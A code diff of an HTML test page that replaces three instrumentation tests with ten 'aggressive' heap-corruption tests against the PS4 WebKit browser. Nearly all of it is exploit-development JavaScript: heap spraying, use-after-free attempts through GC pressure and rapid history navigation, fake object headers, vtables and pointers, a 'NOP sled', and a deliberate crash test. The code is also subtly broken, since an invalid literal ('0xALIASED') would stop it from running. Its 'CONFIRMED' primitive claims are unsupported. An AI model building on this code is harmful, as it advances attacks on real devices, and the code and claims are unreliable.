@@ -2,166 +2,805 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit – Passo 8 Verbose</title>
-<style>
-body { font-family: monospace; background:#000; color:#0f0; }
-button { margin:6px; padding:6px 12px; }
-pre { white-space: pre-wrap; }
-</style>
+<title>PS4 WebKit - Aggressive Corruption Tests</title>
 </head>
 <body>
 
-<h2>PS4 WebKit – Passo 8 (Verbose Instrumentation)</h2>
+<h1>PS4 WebKit - Aggressive Heap Corruption Tests</h1>
 
-<button onclick="runA()">[A] Length Confusion (Verbose)</button>
-<button onclick="runB()">[B] Pointer Drift (Verbose)</button>
-<button onclick="runC()">[C] History Reuse (Verbose)</button>
+<p><b>OBJECTIVE: Force observable memory corruption beyond shared buffer</b></p>
 
-<pre id="log"></pre>
+<p>Based on previous results:</p>
+<ul>
+<li>✅ Shared buffer primitive: CONFIRMED</li>
+<li>✅ Circular ref bypass: CONFIRMED</li>
+<li>⚠️ Heap-wide corruption: NOT YET OBSERVED</li>
+</ul>
+
+<p>These tests will attempt to:</p>
+<ol>
+<li>Force corruption outside history stack</li>
+<li>Trigger UAF through aggressive GC</li>
+<li>Corrupt vtables/metadata</li>
+<li>Cause observable crashes or corruption</li>
+</ol>
+
+<hr>
+
+<h2>Aggressive Tests</h2>
+
+<button onclick="test1()">TEST 1: Heap Spray + Boundary Trigger</button><br>
+<button onclick="test2()">TEST 2: Interleaved Allocations</button><br>
+<button onclick="test3()">TEST 3: GC Timing Attack</button><br>
+<button onclick="test4()">TEST 4: Type Confusion Trigger</button><br>
+<button onclick="test5()">TEST 5: Nested Circular Corruption</button><br>
+<button onclick="test6()">TEST 6: Buffer Aliasing Attack</button><br>
+<button onclick="test7()">TEST 7: History Stack Overflow</button><br>
+<button onclick="test8()">TEST 8: Navigation Timing UAF</button><br>
+<button onclick="test9()">TEST 9: Combined Exploitation</button><br>
+<button onclick="test10()">TEST 10: Crash Attempt (DANGEROUS!)</button><br>
+<br>
+<button onclick="clearLog()">Clear Log</button>
+<button onclick="exportResults()">Export Results</button>
+
+<hr>
+
+<div id="log"></div>
 
 <script>
 const logEl = document.getElementById("log");
-function log(m){ logEl.textContent += m + "\n"; }
-function clearLog(){ logEl.textContent = ""; }
+let testResults = [];
 
-// ===============================
-// BASE SEQUENCE – conhecida
-// ===============================
-function baseHistorySequence(iterations=49){
-  let size = 977;
-  for(let i=0;i<iterations;i++){
-    const payload = "A".repeat(size);
-    log(`[BASE] ITER ${i} size=${size}`);
-    history.pushState({i}, "", "#"+payload);
-    history.replaceState({i, r:true}, "", "#"+payload.slice(0, payload.length>>1));
-    if(i % 5 === 0) setTimeout(()=>history.back(), 0);
-    size += 14461;
-  }
+function log(msg) {
+    const timestamp = new Date().toISOString().split('T')[1].slice(0, 8);
+    const line = '[' + timestamp + '] ' + msg;
+    logEl.textContent += line + '\n';
+    testResults.push({timestamp, message: msg});
+    logEl.scrollTop = logEl.scrollHeight;
 }
 
-// ===============================
-// A — LENGTH CONFUSION (VERBOSE)
-// ===============================
-function runA(){
-  clearLog();
-  log("[A] === Length Confusion Test (Verbose) ===");
-
-  try{
-    baseHistorySequence(49);
-
-    const buf = new ArrayBuffer(0x100);
-    const u8  = new Uint8Array(buf);
-
-    log(`[A] Allocated Uint8Array @ length=${u8.length}`);
-
-    // Preenchimento conhecido
-    for(let i=0;i<u8.length;i++) u8[i] = i & 0xff;
-
-    // Snapshot inicial
-    let fingerprint1 = 0;
-    for(let i=0;i<u8.length;i++) fingerprint1 ^= u8[i];
-
-    log(`[A] Fingerprint BEFORE = 0x${fingerprint1.toString(16)}`);
-
-    // Acesso redundante
-    for(let round=0; round<5; round++){
-      let localXor = 0;
-      for(let i=0;i<u8.length;i++) localXor ^= u8[i];
-      log(`[A] Round ${round} XOR = 0x${localXor.toString(16)}`);
-    }
-
-    // Snapshot final
-    let fingerprint2 = 0;
-    for(let i=0;i<u8.length;i++) fingerprint2 ^= u8[i];
-
-    log(`[A] Fingerprint AFTER  = 0x${fingerprint2.toString(16)}`);
-    log(`[A] Length esperado   = 256`);
-    log(`[A] Length observado  = ${u8.length}`);
-    log(`[A] Fingerprint mudou? ${fingerprint1 !== fingerprint2}`);
-
-    log("[A] === END ===");
-  }catch(e){
-    log("[A] Exception: " + e);
-  }
+function clearLog() {
+    logEl.textContent = '';
+    testResults = [];
 }
 
-// ===============================
-// B — POINTER DRIFT (VERBOSE)
-// ===============================
-function runB(){
-  clearLog();
-  log("[B] === Pointer Drift Test (Verbose) ===");
+function exportResults() {
+    const blob = new Blob([JSON.stringify(testResults, null, 2)], {type: 'application/json'});
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'ps4_aggressive_test_' + Date.now() + '.json';
+    a.click();
+}
 
-  try{
-    baseHistorySequence(49);
-
-    const buf = new ArrayBuffer(0x80);
-    const dv  = new DataView(buf);
-
-    for(let i=0;i<0x80;i+=4)
-      dv.setUint32(i, 0x41414141, true);
-
-    log("[B] Buffer initialized with 0x41414141");
-
-    for(let pass=0; pass<6; pass++){
-      let drift = false;
-      log(`[B] Pass ${pass}`);
-      for(let i=0;i<0x80;i+=4){
-        const v = dv.getUint32(i, true);
-        if(v !== 0x41414141){
-          log(`[B] DRIFT at offset ${i}: 0x${v.toString(16)}`);
-          drift = true;
-          break;
+// TEST 1: Heap Spray + Boundary Trigger
+function test1() {
+    log('=== TEST 1: Heap Spray + Boundary Trigger ===');
+    
+    try {
+        // Phase 1: Spray heap with controlled objects
+        log('[PHASE 1] Spraying heap with 200 objects...');
+        const spray = [];
+        for(let i = 0; i < 200; i++) {
+            spray.push({
+                id: i,
+                marker: 0x41414100 + i,
+                buffer: new ArrayBuffer(1024),
+                data: 'X'.repeat(500)
+            });
         }
-      }
-      log(`[B] Drift detected this pass? ${drift}`);
+        
+        log('Heap sprayed');
+        
+        // Phase 2: Create holes by nullifying some
+        log('[PHASE 2] Creating holes in heap...');
+        for(let i = 50; i < 150; i += 10) {
+            spray[i] = null;
+        }
+        
+        log('Created 10 holes');
+        
+        // Phase 3: Push boundary-size payload with circular ref
+        log('[PHASE 3] Pushing boundary payload with circular ref...');
+        
+        const buffer = new ArrayBuffer(2048);
+        const view = new Uint32Array(buffer);
+        
+        // Fill with pattern
+        for(let i = 0; i < view.length; i++) {
+            view[i] = 0xDEADBEEF;
+        }
+        
+        const payload = {
+            data: 'A'.repeat(977), // At boundary
+            buffer: buffer,
+            view: view,
+            self: null
+        };
+        payload.self = payload;
+        
+        history.pushState(payload, "", "#spray");
+        log('Boundary payload pushed');
+        
+        // Phase 4: Trigger with replaceState
+        history.replaceState(payload, "", "#spray2");
+        log('ReplaceState triggered');
+        
+        // Phase 5: Check spray for corruption
+        log('[PHASE 5] Checking spray objects for corruption...');
+        let corruptions = 0;
+        
+        for(let i = 0; i < spray.length; i++) {
+            if(spray[i] && spray[i].marker !== 0x41414100 + i) {
+                log('[CORRUPTION] Object ' + i + ' marker changed!');
+                corruptions++;
+            }
+        }
+        
+        if(corruptions > 0) {
+            log('[CRITICAL] Detected ' + corruptions + ' corrupted objects!');
+        } else {
+            log('[INFO] No corruption in spray objects');
+        }
+        
+        // Phase 6: Access through circular ref
+        const retrieved = history.state;
+        const testView = new Uint32Array(retrieved.buffer);
+        
+        log('[TEST] Writing through circular ref...');
+        testView[0] = 0xBADBADBA;
+        
+        const verifyView = new Uint32Array(retrieved.self.buffer);
+        log('Verify: 0x' + verifyView[0].toString(16));
+        
+    } catch(e) {
+        log('[CRASH] Exception: ' + e.message);
     }
-
-    log("[B] === END ===");
-  }catch(e){
-    log("[B] Exception: " + e);
-  }
 }
 
-// ===============================
-// C — HISTORY REUSE (VERBOSE)
-// ===============================
-function runC(){
-  clearLog();
-  log("[C] === History Reuse Test (Verbose) ===");
-
-  try{
-    baseHistorySequence(49);
-
-    const marker = Math.floor(Math.random()*0xffffffff);
-    log(`[C] Sentinel marker = 0x${marker.toString(16)}`);
-
-    history.pushState({sentinel:marker}, "", "#SENTINEL");
-    history.back();
-
-    setTimeout(()=>{
-      const st = history.state;
-      log("[C] history.state dump:");
-      log(JSON.stringify(st));
-
-      if(st && typeof st === "object"){
-        log(`[C] sentinel present? ${"sentinel" in st}`);
-        log(`[C] sentinel value  = ${st.sentinel}`);
-        log(`[C] sentinel match? ${st.sentinel === marker}`);
-      } else {
-        log("[C] state is null or non-object");
-      }
-
-      log("[C] === END ===");
-    }, 80);
-
-  }catch(e){
-    log("[C] Exception: " + e);
-  }
+// TEST 2: Interleaved Allocations
+function test2() {
+    log('=== TEST 2: Interleaved Allocations ===');
+    
+    try {
+        log('[SETUP] Creating interleaved pattern...');
+        
+        const objects = [];
+        
+        // Interleave: History state, buffer, history state, buffer...
+        for(let i = 0; i < 20; i++) {
+            // Create buffer
+            const buf = new ArrayBuffer(1024);
+            const view = new Uint32Array(buf);
+            view[0] = 0x11111111 + i;
+            objects.push({type: 'buffer', buf: buf, view: view});
+            
+            // Push to history with circular ref
+            const payload = {
+                id: i,
+                data: 'A'.repeat(977),
+                buffer: buf,
+                self: null
+            };
+            payload.self = payload;
+            
+            history.pushState(payload, "", "#inter_" + i);
+            objects.push({type: 'history', payload: payload});
+            
+            if(i % 5 === 0) {
+                log('Interleaved ' + i + ' pairs');
+            }
+        }
+        
+        log('[TRIGGER] Navigating back and forth...');
+        
+        for(let i = 0; i < 10; i++) {
+            history.back();
+        }
+        for(let i = 0; i < 10; i++) {
+            history.forward();
+        }
+        
+        log('[CHECK] Verifying buffer integrity...');
+        
+        let corrupted = 0;
+        for(let i = 0; i < objects.length; i++) {
+            if(objects[i].type === 'buffer') {
+                const check = objects[i].view[0];
+                const expected = 0x11111111 + Math.floor(i / 2);
+                if(check !== expected) {
+                    log('[CORRUPTION] Buffer ' + i + ' corrupted!');
+                    log('  Expected: 0x' + expected.toString(16));
+                    log('  Got: 0x' + check.toString(16));
+                    corrupted++;
+                }
+            }
+        }
+        
+        if(corrupted > 0) {
+            log('[CRITICAL] ' + corrupted + ' buffers corrupted!');
+        } else {
+            log('[INFO] All buffers intact');
+        }
+        
+    } catch(e) {
+        log('[ERROR] ' + e.message);
+    }
 }
 
-log("Ready. Choose a test.");
+// TEST 3: GC Timing Attack
+function test3() {
+    log('=== TEST 3: GC Timing Attack ===');
+    
+    try {
+        log('[PHASE 1] Creating many circular refs...');
+        
+        const refs = [];
+        for(let i = 0; i < 100; i++) {
+            const obj = {
+                id: i,
+                data: 'X'.repeat(1000),
+                buffer: new ArrayBuffer(2048),
+                self: null
+            };
+            obj.self = obj;
+            refs.push(obj);
+            
+            if(i % 20 === 0) {
+                history.pushState(obj, "", "#gc_" + i);
+            }
+        }
+        
+        log('Created 100 circular refs, 5 in history');
+        
+        // Clear local refs to trigger GC
+        log('[PHASE 2] Clearing local references...');
+        refs.length = 0;
+        
+        // Force GC pressure
+        log('[PHASE 3] Applying GC pressure...');
+        const gcPressure = [];
+        for(let i = 0; i < 50; i++) {
+            gcPressure.push(new ArrayBuffer(1024 * 1024)); // 1MB each
+        }
+        
+        log('Applied 50MB GC pressure');
+        
+        // Try to access history after GC
+        log('[PHASE 4] Accessing history after GC...');
+        
+        for(let i = 0; i < 5; i++) {
+            history.back();
+        }
+        
+        try {
+            const state = history.state;
+            if(state) {
+                log('Retrieved state: ' + state.id);
+                
+                // Try to access through circular ref
+                if(state.self) {
+                    log('Circular ref still accessible');
+                    
+                    // Try to use buffer
+                    if(state.buffer) {
+                        const view = new Uint32Array(state.buffer);
+                        view[0] = 0x99999999;
+                        log('Buffer write succeeded: 0x' + view[0].toString(16));
+                    }
+                } else {
+                    log('[UAF?] Circular ref is null!');
+                }
+            } else {
+                log('[UAF?] History state is null!');
+            }
+        } catch(e) {
+            log('[UAF DETECTED] Exception accessing state: ' + e.message);
+        }
+        
+    } catch(e) {
+        log('[ERROR] ' + e.message);
+    }
+}
+
+// TEST 4: Type Confusion Trigger
+function test4() {
+    log('=== TEST 4: Type Confusion Trigger ===');
+    
+    try {
+        // Create buffer that will be interpreted as different types
+        const buffer = new ArrayBuffer(1024);
+        const uint32view = new Uint32Array(buffer);
+        const float64view = new Float64Array(buffer);
+        const uint8view = new Uint8Array(buffer);
+        
+        // Write as uint32
+        uint32view[0] = 0x41414141;
+        uint32view[1] = 0x42424242;
+        
+        log('[SETUP] Buffer with multiple views created');
+        
+        // Create circular structure with all views
+        const confusion = {
+            buffer: buffer,
+            uint32: uint32view,
+            float64: float64view,
+            uint8: uint8view,
+            self: null,
+            nested: null
+        };
+        
+        const nested = {
+            parent: confusion,
+            buffer: buffer,
+            uint32: new Uint32Array(buffer),
+            float64: new Float64Array(buffer)
+        };
+        
+        confusion.nested = nested;
+        confusion.self = confusion;
+        
+        log('[PUSH] Pushing type confusion payload...');
+        history.pushState(confusion, "", "#typeconf");
+        
+        // Retrieve and try to cause confusion
+        const retrieved = history.state;
+        
+        log('[TEST] Accessing through different type views...');
+        
+        // Write as float64
+        const rFloat = new Float64Array(retrieved.buffer);
+        rFloat[0] = 1.234567890123456;
+        
+        // Read as uint32
+        const rUint32 = new Uint32Array(retrieved.buffer);
+        log('Float written, uint32 reads: 0x' + rUint32[0].toString(16) + 
+            ' 0x' + rUint32[1].toString(16));
+        
+        // Read through circular ref
+        const cUint32 = new Uint32Array(retrieved.self.buffer);
+        log('Via circular ref: 0x' + cUint32[0].toString(16) + 
+            ' 0x' + cUint32[1].toString(16));
+        
+        // Read through nested
+        const nUint32 = new Uint32Array(retrieved.nested.buffer);
+        log('Via nested: 0x' + nUint32[0].toString(16) + 
+            ' 0x' + nUint32[1].toString(16));
+        
+        // Try to craft fake pointer via float
+        log('[EXPLOIT] Crafting fake pointer...');
+        const TARGET_ADDR = 0x41414141;
+        cUint32[0] = TARGET_ADDR;
+        cUint32[1] = 0x00000000;
+        
+        const fakeFloat = rFloat[0];
+        log('Fake pointer as float: ' + fakeFloat);
+        
+    } catch(e) {
+        log('[ERROR] ' + e.message);
+    }
+}
+
+// TEST 5: Nested Circular Corruption
+function test5() {
+    log('=== TEST 5: Nested Circular Corruption ===');
+    
+    try {
+        // Create deep nested circular structure
+        const depth = 50;
+        const chain = [];
+        
+        log('[SETUP] Creating nested circular chain (depth=' + depth + ')...');
+        
+        for(let i = 0; i < depth; i++) {
+            const node = {
+                id: i,
+                data: 'N'.repeat(977),
+                buffer: new ArrayBuffer(1024),
+                prev: i > 0 ? chain[i - 1] : null,
+                next: null,
+                self: null
+            };
+            
+            node.self = node;
+            
+            if(i > 0) {
+                chain[i - 1].next = node;
+            }
+            
+            chain.push(node);
+        }
+        
+        // Close the circle
+        chain[depth - 1].next = chain[0];
+        chain[0].prev = chain[depth - 1];
+        
+        log('Created circular chain of ' + depth + ' nodes');
+        
+        // Push root node
+        history.pushState(chain[0], "", "#nested_circ");
+        log('Pushed circular chain to history');
+        
+        // Navigate and access
+        const retrieved = history.state;
+        
+        log('[TEST] Walking circular chain...');
+        let current = retrieved;
+        let steps = 0;
+        
+        for(let i = 0; i < depth * 2; i++) {
+            if(!current || !current.next) {
+                log('[CORRUPTION?] Chain broken at step ' + i);
+                break;
+            }
+            current = current.next;
+            steps++;
+        }
+        
+        log('Walked ' + steps + ' steps (expected ' + (depth * 2) + ')');
+        
+        if(steps === depth * 2) {
+            log('[INFO] Circular chain intact');
+        } else {
+            log('[CORRUPTION] Circular chain corrupted!');
+        }
+        
+        // Try to corrupt through chain
+        log('[TEST] Writing through chain nodes...');
+        current = retrieved;
+        for(let i = 0; i < Math.min(10, depth); i++) {
+            const buf = new Uint32Array(current.buffer);
+            buf[0] = 0xC0C0C0C0 + i;
+            current = current.next;
+        }
+        
+        log('Wrote to 10 nodes');
+        
+    } catch(e) {
+        log('[ERROR] ' + e.message);
+    }
+}
+
+// TEST 6: Buffer Aliasing Attack
+function test6() {
+    log('=== TEST 6: Buffer Aliasing Attack ===');
+    
+    try {
+        // Create ONE buffer shared by MANY objects
+        const sharedBuffer = new ArrayBuffer(4096);
+        const mainView = new Uint32Array(sharedBuffer);
+        
+        // Fill with pattern
+        for(let i = 0; i < mainView.length; i++) {
+            mainView[i] = i;
+        }
+        
+        log('[SETUP] Created shared buffer (4KB)');
+        
+        // Create multiple objects all referencing same buffer
+        const aliases = [];
+        for(let i = 0; i < 20; i++) {
+            const alias = {
+                id: i,
+                buffer: sharedBuffer,
+                view: new Uint32Array(sharedBuffer),
+                offset: i * 50,
+                self: null
+            };
+            alias.self = alias;
+            aliases.push(alias);
+        }
+        
+        log('Created 20 aliases of same buffer');
+        
+        // Push all to history
+        log('[PUSH] Pushing all aliases to history...');
+        for(let i = 0; i < aliases.length; i++) {
+            history.pushState(aliases[i], "", "#alias_" + i);
+        }
+        
+        log('All aliases pushed');
+        
+        // Retrieve and modify through one
+        log('[TEST] Modifying through one alias...');
+        const retrieved = history.state;
+        const modView = new Uint32Array(retrieved.buffer);
+        modView[100] = 0xALIASED;
+        
+        log('Modified buffer through last alias');
+        
+        // Check if all aliases see it
+        log('[VERIFY] Checking if all aliases see modification...');
+        history.go(-19); // Go back to first
+        
+        setTimeout(() => {
+            const first = history.state;
+            if(first && first.buffer) {
+                const checkView = new Uint32Array(first.buffer);
+                const val = checkView[100];
+                log('First alias sees: 0x' + val.toString(16));
+                
+                if(val === 0xALIASED) {
+                    log('[CRITICAL] Modification visible across history!');
+                    log('[CRITICAL] Buffer truly shared across history stack!');
+                } else {
+                    log('[INFO] Buffers are isolated per history entry');
+                }
+            }
+        }, 100);
+        
+    } catch(e) {
+        log('[ERROR] ' + e.message);
+    }
+}
+
+// TEST 7: History Stack Overflow
+function test7() {
+    log('=== TEST 7: History Stack Overflow ===');
+    
+    try {
+        log('[TEST] Attempting to overflow history stack...');
+        
+        const COUNT = 1000;
+        
+        for(let i = 0; i < COUNT; i++) {
+            const payload = {
+                id: i,
+                data: 'A'.repeat(977),
+                buffer: new ArrayBuffer(2048),
+                self: null
+            };
+            payload.self = payload;
+            
+            try {
+                history.pushState(payload, "", "#overflow_" + i);
+                
+                if(i % 100 === 0) {
+                    log('Pushed ' + i + ' entries');
+                }
+            } catch(e) {
+                log('[LIMIT] Hit history limit at ' + i + ': ' + e.message);
+                break;
+            }
+        }
+        
+        log('[TEST] Attempting to navigate through large stack...');
+        
+        try {
+            for(let i = 0; i < 100; i++) {
+                history.back();
+            }
+            log('Navigated back 100 entries');
+            
+            for(let i = 0; i < 100; i++) {
+                history.forward();
+            }
+            log('Navigated forward 100 entries');
+            
+        } catch(e) {
+            log('[CRASH] Navigation caused exception: ' + e.message);
+        }
+        
+    } catch(e) {
+        log('[ERROR] ' + e.message);
+    }
+}
+
+// TEST 8: Navigation Timing UAF
+function test8() {
+    log('=== TEST 8: Navigation Timing UAF ===');
+    
+    try {
+        const buffer = new ArrayBuffer(2048);
+        const view = new Uint32Array(buffer);
+        view.fill(0x88888888);
+        
+        const payload = {
+            data: 'A'.repeat(977),
+            buffer: buffer,
+            view: view,
+            self: null
+        };
+        payload.self = payload;
+        
+        log('[SETUP] Pushing payload...');
+        history.pushState(payload, "", "#uaf1");
+        history.pushState({dummy: 1}, "", "#uaf2");
+        history.pushState({dummy: 2}, "", "#uaf3");
+        
+        log('[TEST] Rapid navigation to trigger UAF...');
+        
+        // Rapid back/forward to confuse state
+        for(let i = 0; i < 50; i++) {
+            history.back();
+            history.forward();
+            history.back();
+            history.back();
+            history.forward();
+            history.forward();
+        }
+        
+        log('Rapid navigation completed');
+        
+        // Try to access original payload
+        log('[TEST] Accessing original payload after navigation...');
+        
+        try {
+            // Try to modify through original reference
+            view[0] = 0xDEADBEEF;
+            log('Modified through original ref: 0x' + view[0].toString(16));
+            
+            // Navigate back to check
+            history.go(-2);
+            
+            setTimeout(() => {
+                const retrieved = history.state;
+                if(retrieved && retrieved.buffer) {
+                    const checkView = new Uint32Array(retrieved.buffer);
+                    log('Retrieved value: 0x' + checkView[0].toString(16));
+                    
+                    if(checkView[0] === 0xDEADBEEF) {
+                        log('[CONFIRMED] Modification persisted!');
+                    } else {
+                        log('[INFO] Buffer was cloned');
+                    }
+                } else {
+                    log('[UAF?] Could not retrieve buffer');
+                }
+            }, 100);
+            
+        } catch(e) {
+            log('[UAF DETECTED] Exception: ' + e.message);
+        }
+        
+    } catch(e) {
+        log('[ERROR] ' + e.message);
+    }
+}
+
+// TEST 9: Combined Exploitation
+function test9() {
+    log('=== TEST 9: Combined Exploitation ===');
+    
+    try {
+        log('[PHASE 1] Setting up complex scenario...');
+        
+        // Phase 1: Heap spray
+        const spray = [];
+        for(let i = 0; i < 50; i++) {
+            spray.push(new ArrayBuffer(1024));
+        }
+        
+        // Phase 2: Shared buffer in circular ref
+        const sharedBuf = new ArrayBuffer(4096);
+        const view = new Uint32Array(sharedBuf);
+        
+        const obj1 = {
+            id: 'obj1',
+            data: 'A'.repeat(977),
+            buffer: sharedBuf,
+            self: null,
+            nested: null
+        };
+        
+        const obj2 = {
+            id: 'obj2',
+            data: 'B'.repeat(977),
+            buffer: sharedBuf,
+            parent: obj1
+        };
+        
+        obj1.nested = obj2;
+        obj1.self = obj1;
+        
+        log('[PUSH] Pushing complex payload...');
+        history.pushState(obj1, "", "#combined");
+        
+        // Phase 3: Write through circular ref
+        log('[WRITE] Writing fake object structures...');
+        
+        const retrieved = history.state;
+        const wview = new Uint32Array(retrieved.buffer);
+        
+        // Write fake JSObject header
+        wview[0] = 0x00000000; // Type tag
+        wview[1] = 0xFFFFFFFF; // Flags
+        wview[2] = 0x41414141; // Fake pointer 1
+        wview[3] = 0x42424242; // Fake vtable
+        
+        log('Wrote fake object at offset 0');
+        
+        // Verify through circular ref
+        const vview = new Uint32Array(retrieved.self.buffer);
+        log('Verify vtable: 0x' + vview[3].toString(16));
+        
+        // Phase 4: Try to trigger
+        log('[TRIGGER] Attempting to trigger via navigation...');
+        
+        history.replaceState(retrieved, "", "#combined2");
+        history.back();
+        history.forward();
+        
+        log('[TEST] Checking if structures persist...');
+        const check = history.state;
+        if(check && check.buffer) {
+            const cview = new Uint32Array(check.buffer);
+            log('Fake vtable still at: 0x' + cview[3].toString(16));
+        }
+        
+    } catch(e) {
+        log('[ERROR] ' + e.message);
+    }
+}
+
+// TEST 10: Crash Attempt
+function test10() {
+    log('=== TEST 10: Intentional Crash Attempt (DANGEROUS!) ===');
+    log('[WARNING] This test may crash the browser!');
+    log('');
+    
+    try {
+        // Combination of all techniques
+        log('[CRASH ATTEMPT] Combining all primitives...');
+        
+        const buffer = new ArrayBuffer(8192);
+        const view = new Uint32Array(buffer);
+        
+        // Fill with NOP sled and fake structures
+        for(let i = 0; i < 256; i++) {
+            view[i] = 0x90909090; // NOP sled
+        }
+        
+        // Fake object
+        view[256] = 0x00000000;
+        view[257] = 0xFFFFFFFF;
+        view[258] = 0x41414141;
+        view[259] = 0x90909090; // Point to NOP sled
+        
+        const crashPayload = {
+            data: 'A'.repeat(978), // OVER boundary
+            buffer: buffer,
+            view: view,
+            self: null,
+            nested: null
+        };
+        
+        const nested = crashPayload;
+        crashPayload.nested = nested;
+        crashPayload.self = crashPayload;
+        
+        log('[PUSH] Pushing crash payload...');
+        
+        // Multiple push/replace cycles
+        for(let i = 0; i < 10; i++) {
+            history.pushState(crashPayload, "", "#crash_" + i);
+            history.replaceState(crashPayload, "", "#crash_" + i + "_r");
+        }
+        
+        log('[NAVIGATE] Rapid navigation...');
+        
+        for(let i = 0; i < 100; i++) {
+            history.back();
+            history.forward();
+        }
+        
+        log('[SURVIVE] No crash occurred');
+        
+    } catch(e) {
+        log('[CRASH] Exception: ' + e.message);
+        if(e.stack) log('Stack: ' + e.stack);
+    }
+}
+
+log('PS4 WebKit Aggressive Corruption Tests Loaded');
+log('');
+log('These tests attempt to force observable corruption');
+log('beyond the shared buffer primitive.');
+log('');
+log('REMEMBER: Shared buffer + circular ref primitives');
+log('are STILL REAL regardless of these test results!');
+log('');
 </script>
+
 </body>
 </html>
-
